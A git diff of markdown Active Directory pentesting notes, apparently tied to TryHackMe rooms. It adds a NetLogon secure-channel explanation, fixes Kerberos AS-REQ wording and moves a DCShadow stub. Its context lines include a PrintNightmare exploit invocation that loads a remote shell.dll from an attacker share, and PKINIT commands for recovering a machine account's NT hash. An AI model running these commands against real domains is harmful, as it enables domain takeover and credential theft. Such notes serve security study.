@@ -55,6 +55,20 @@ NTLM can be used for both local authentication and network authentication. NetNT
 [![adenumeration](../../../../cybersecurity/_badges/thm/adenumeration.svg)](https://tryhackme.com/r/room/adenumeration)
 
 When using a domain such as `\\domain`, Kerberos Authentication is used. When using an IP such as `\\IP`, NTLM may be used instead.
+
+<br>
+
+#### NetLogon
+
+NetLogon is used to establish a secure chanel between a computer and the domain controller. It is also used to support authentication messages <small>(such as AS-REQ with Kerberos)</small> for instance, determining the DC to contact and ensuring the client can reach it securely.
+
+The secure channel (Schannel) is protected by session keys.
+
+* 👋 The client sends a nonce and requests a session
+  🔐 The server replies with a new nonce and the client's nonce, both encrypted with the shared secret.
+* ✅ The client responds with their nonce encrypted with their secret and the server nonce encrypted with the shared secret
+
+The shared secret is typically derived from the machine account password while the client secret is typically derived from the user hash or the machine account password. `AES(client secret or resp. shared secret, nonce)` is used to generate the session key.
 </div><div>
 
 
@@ -68,7 +82,7 @@ Kerberos is a protocol used to provide secure authentication over non-secure net
 
 **Port(s)** 🐲: 88 <small>(TCP)</small>
 
-The user send a **AES-REQ** with some data and a timestamp encrypted with their NT Hash and their username. The DC decrypts the value, check the timestamp, and reply with a **AES-REQ**. It contains a **ticket-granting ticket (TGT)** 🎫 that proves they are authenticated AND a copy of the **session key** 🔑 encrypted with the user hash.
+The user send a **AS-REQ** with some data and a timestamp encrypted with their NT Hash and their username. The DC decrypts the value, check the timestamp, and reply with a **AS-REQ**. It contains a **ticket-granting ticket (TGT)** 🎫 that proves they are authenticated AND a copy of the **session key** 🔑 encrypted with the user hash.
 
 The TGT is encrypted with the hash of the `krgtgt` account <small>(1/DC)</small>.
 
@@ -765,6 +779,12 @@ $ DEST="$HOME/tools/PrintNightmare"
 $ git clone -b "main" https://github.com/cube0x0/CVE-2021-1675.git $DEST
 $ python3 $DEST/CVE-2021-1675.py domain/username:password@IP '\\HOST_IP\share\shell.dll'
 ```
+
+<br>
+
+#### DCShadow
+
+...
 </div><div>
 
 #### PetitPotam
@@ -796,12 +816,6 @@ $ python3 gettgtpkinit.py example.com\COMPUTE_ACCOUNT_NAME\$ -pfx-base64 ...SNIP
 $ # use ccache file or request a TGS with the user hash
 $ python3 getnthash.py -key <from gettgt> example.com\COMPUTE_ACCOUNT_NAME\$
 ```
-
-<br>
-
-#### DCShadow
-
-...
 
 <br>
 
